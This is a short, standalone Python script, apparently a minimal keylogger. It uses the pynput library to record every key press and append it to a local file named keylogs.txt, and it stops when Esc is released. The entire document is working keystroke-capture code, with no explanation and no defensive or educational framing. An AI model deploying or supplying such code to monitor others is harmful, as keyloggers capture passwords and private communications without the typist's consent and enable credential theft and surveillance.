import pynput

def on_press(key):
    try:
        current = str(key.char)
    except AttributeError:
        current = str(key)
    with open("keylogs.txt", "a") as f:
        f.write(current)

def on_release(key):
    if str(key) == "Key.esc":
        return False

with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
